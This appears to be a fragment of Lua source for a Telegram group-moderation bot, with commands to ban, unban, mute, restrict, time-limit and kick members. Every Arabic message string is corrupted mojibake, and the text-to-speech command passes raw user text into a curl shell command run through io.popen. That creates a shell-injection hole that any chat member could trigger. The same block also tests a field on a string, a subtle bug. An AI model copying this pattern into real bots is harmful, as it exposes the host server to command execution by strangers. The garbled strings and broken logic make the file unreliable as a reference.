Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end,nil)   
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ­ΨΈΨ± @(.*)$") and Addictive(msg) then
local username = text:match("^Ψ­ΨΈΨ± @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
database:sadd(bot_id.."Tshake:Ban:User"..msg.chat_id_, result.id_)
Kick_Group(msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end,nil)   
end
else
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ­ΨΈΨ± (%d+)$") and Addictive(msg) then
local userid = text:match("^Ψ­ΨΈΨ± (%d+)$") 
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
database:sadd(bot_id.."Tshake:Ban:User"..msg.chat_id_, userid)
Kick_Group(msg.chat_id_, userid)  
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end,nil)   
end
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
function Function_Tshake(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "βοΈβΏΨ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)$") and Addictive(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "βοΈβΏΨ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§")  
else
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)$") and Addictive(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ± (%d+)$") 
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, "βοΈβΏΨ§ΩΨ§ ΩΨ³Ψͺ ΩΨ­ΨΈΩΨ±Ψ§ \n") 
return false 
end
database:srem(bot_id.."Tshake:Ban:User"..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ ΩΩΨ§")  
return false
end

if text == ("ΩΨͺΩ") and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
return false 
end     
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^ΩΨͺΩ @(.*)$") and Addictive(msg) then
local username = text:match("^ΩΨͺΩ @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end     
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
else
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^ΩΨͺΩ (%d+)$") and Addictive(msg) then
local userid = text:match("^ΩΨͺΩ (%d+)$")
if Rank_Checking(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
end
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)$") and Addictive(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_, result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end

if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)$") and Addictive(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ (%d+)$") 
database:srem(bot_id.."Tshake:Muted:User"..msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩΩ ΩΩ ΩΩΨ§")  
return false
end

if text == ("ΨͺΩΩΨ―") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΩΨ― @(.*)$") and Addictive(msg) then
local username = text:match("^ΨͺΩΩΨ― @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
else
send(msg.chat_id_, msg.id_,"πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^ΨͺΩΩΨ― (%d+)$") and Addictive(msg) then
local userid = text:match("^ΨͺΩΩΨ― (%d+)$")
if Rank_Checking(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
Reply_Status(msg,userid,"reply","πβΏΨͺΩ ΨͺΩΩΩΨ―Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")  
end
return false
end
if text and text:match('^ΨͺΩΩΨ― (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
local TextEnd = {string.match(text, "^(ΨͺΩΩΨ―) (%d+) (.*)$")}
function Function_Tshake(extra, result, success)
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.sender_user_id_,"reply", "ββΏΨͺΩ ΨͺΩΩΨ―Ω ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨ·Ω (.*)$") then
   local textntk = text:match("^Ψ§ΩΨ·Ω (.*)$")
   UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(textntk)..'')
   Antk = JSON.decode(UrlAntk)
   if UrlAntk.ok ~= false then
   download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3')
   local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "document=@'..''..textntk..'.mp3'..'"' io.popen(curlm)
   end
   end
if text and text:match('^ΨͺΩΩΨ― (%d+) (.*) @(.*)$') and Addictive(msg) then
local TextEnd = {string.match(text, "^(ΨͺΩΩΨ―) (%d+) (.*) @(.*)$")}
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if TextEnd[3] == 'ΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'Ψ³Ψ§ΨΉΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'Ψ―ΩΩΩΩ' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('Ψ―ΩΩΩΩ',"Ψ―ΩΨ§ΩΩ") 
TextEnd[3] = TextEnd[3]:gsub('Ψ³Ψ§ΨΉΩ',"Ψ³Ψ§ΨΉΨ§Ψͺ") 
TextEnd[3] = TextEnd[3]:gsub("ΩΩΩ","Ψ§ΩΨ§Ω") 
if Rank_Checking(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
Reply_Status(msg,result.id_,"reply", "ββΏΨͺΩ ΨͺΩΩΨ―Ω ΩΩΨ―Ψ© ~ { "..TextEnd[2]..' '..TextEnd[3]..'}')
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text == ("Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―") and tonumber(msg.reply_to_message_id_) ~= 0 and Addictive(msg) then
function Function_Tshake(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― @(.*)$") and Addictive(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,result.id_,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω")  
else
send(msg.chat_id_, msg.id_, "πβΏΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― (%d+)$") and Addictive(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ― (%d+)$")
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
Reply_Status(msg,userid,"reply","πβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ―Ω")  
return false
end
if text == ("Ψ·Ψ±Ψ―") and msg.reply_to_message_id_ ~=0 and Addictive(msg) then
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if Rank_Checking(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"πβΏΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false  
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false  
end
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","πβΏΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§")  
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end  
if text and text:match("^Ψ·Ψ±Ψ― @(.*)$") and Addictive(msg) then 
local username = text:match("^Ψ·Ψ±Ψ― @(.*)$")
if not Constructor(msg) and database:get(bot_id.."Ban:Cheking"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'πβΏΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ± Ω Ψ§ΩΨ·Ψ±Ψ― ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ')
return false
end
function Function_Tshake(extra, result, success)
if result.id_ then
if Rank_Checking(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\nπβΏΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(result.id_,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
